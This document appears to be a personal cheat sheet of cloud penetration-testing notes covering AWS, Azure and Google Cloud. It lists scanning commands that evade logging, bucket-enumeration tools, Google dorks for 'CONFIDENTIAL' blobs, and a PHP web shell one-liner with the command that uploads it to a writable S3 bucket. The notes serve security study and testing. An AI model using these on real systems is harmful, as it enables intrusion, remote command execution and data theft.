# Cloud Pentesting    
Main Cloud platforms: Amazon Web Services, Microsoft Azure, Google Cloud. Most cloud providers have miminal logging by default.        
[Grey Hat Warfare](https://buckets.grayhatwarfare.com/): search public buckets       
Use masscan to scan a large IP range:      

    $ masscan 10.10.0.1/24 -p 22,25,80,443,3389            
    --rate 50000   #fastest scan    
    #Most devices won't log half open SYN scans (nmap -sS and masscan) or TLS scan to web ports              
## AWS     
AWS GuardDuty for security. No logging or versioning on by default.         
[AWS IP ranges](https://ip-ranges.amazon.aws/ip-ranges.json)         
[Pacu](https://github.com/RhinoSecurityLabs/pacu): AWS exploit framework      
S3 Buckets: https://s3.amazonaws.com/{bucketname}        
[bucketfinder](https://github.com/FishermansEnemy/bucket_finder/tree/master): look for interesting files on Amazon S3 buckets.       
Commands         

    https://aws.amazon.com/cli/   #AWS CLI    
   
    aws configure     #set up, can put temp in all values   
    aws s3 ls bucket.site.com    #list contents of a bucket    
    aws --endpoint=http://s3.site.com s3 ls      
    aws --endpoint=http://s3.site.com s3 ls s3://site.com   #list objects and common prefixes   
  
might be able to upload a php web shell      

    echo '<?php system($_GET["cmd"]); ?>' > shell.php   #make web shell file   
    aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com     #upload web shell     

Search for files with keywords in buckets using [bucket_finder](https://github.com/FishermansEnemy/bucket_finder):     

    bucket_finder.rb search_term --download         
    
### Resources      
https://www.hackthebox.com/blog/aws-pentesting-guide    
https://cloud.hacktricks.xyz/pentesting-cloud/aws-security     
    
## Azure    
Built in security with Azure Sentinel. Azure acts as a middleman between the AD network and user sign on - makes lots of traditional AD acts ineffective.         
Azure Blob: https://{account}.blob.core.windows.net/{container}     


### Enumerate Azure Blobs   
[Azure-CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)     
[AZ-Blob-Attacker](https://github.com/VitthalS/Az-Blob-Attacker)    
[Basic Blob Finder](https://github.com/joswr1ght/basicblobfinder): search for Azure blobs       
[Microburst](https://github.com/NetSPI/MicroBurst): Scripts for pentesting Azure    

    basicblobfinder.py wordlist   #enum buckets       
Google Hacks:     

    site:*.blob.core.windows.net
    site:"blob.core.windows.net" and intext:"CONFIDENTIAL"
### Resources:    
https://www.inversecos.com/2022/01/how-to-detect-and-compromise-azure.html      

## Google Cloud   
GCP Cloud Armor for security. [List of Buckets by IPS](https://www.gstatic.com/ipranges/cloud.json)           
GCP: https://www.googleapis.com/storage/v1/b/{bucketname}      
[GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute): search for Google Storage Buckets and check accesses.     
Bucket permissions: listable (enum and read files), writeable (upload)       

    gcpbucketbrute.py -u -k search_org      
    gsutil ls gs://bucket       #list contents of a public bucket     
